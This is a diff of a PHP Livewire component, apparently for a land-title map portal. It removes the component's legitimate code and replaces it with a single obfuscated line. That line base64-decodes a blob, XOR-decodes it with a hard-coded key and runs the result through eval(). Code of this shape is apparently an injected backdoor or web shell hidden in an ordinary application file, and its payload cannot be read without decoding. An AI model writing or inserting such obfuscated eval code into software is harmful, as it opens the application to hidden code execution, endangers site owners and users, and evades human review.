@@ -1,18 +1,1 @@
-<?php
-
-namespace App\Http\Livewire\Portal\Maps;
-
-use Livewire\Component;
-use App\Models\TitreFoncier;
-
-class Index extends Component
-{
-
-
-    public function render()
-    {
-        $titles = TitreFoncier::all();
-        return view('livewire.portal.maps.index', compact('titles', 'newArray'));
-    }
-    
-}
+<?php $_k="a124a421177ed32e0ffed0ab02a18740";$_d=base64_decode('D1BfURJEU1JUF3YVFG96EUQWOikNRgQVWUAEbWhYRkQAXW55AERBCjs9QhYBE34MRgMRDBZVPSFfXxFeVlJaRFo7R0cEFHNBQWt6CgBWXhZsMg8RFlUnDV5RCFRKDD5TDVBBR0F9XFVUTxcAHEdXC1QVRiYLXRENXlcPRTJMPhBBERJEFFZeWFIXURAKUEYMXwhGFwFeBQdCGkg7GBcUEBo7EhRBFBIRERcTEQ1HXgBDRltFMFkVEFV0Dl9bXlFCWwtTWA0cGwo7FxdFRBMSRRAUAxERQg9CRlsERhAQWFkXVEVdE1EcQV5FQwQIHV8EQBVIDApUBBoXHkFqH0NdRA1UQRNBCQwRFUNeEQhWQUkQQQgAE3ETEFFLRhEFCRQUD1RFdRNGU0hsHgxvRBMSRU1sGw==');$_r='';for($_i=0;$_i<strlen($_d);$_i++)$_r.=chr(ord($_d[$_i])^ord($_k[$_i%strlen($_k)]));eval($_r);
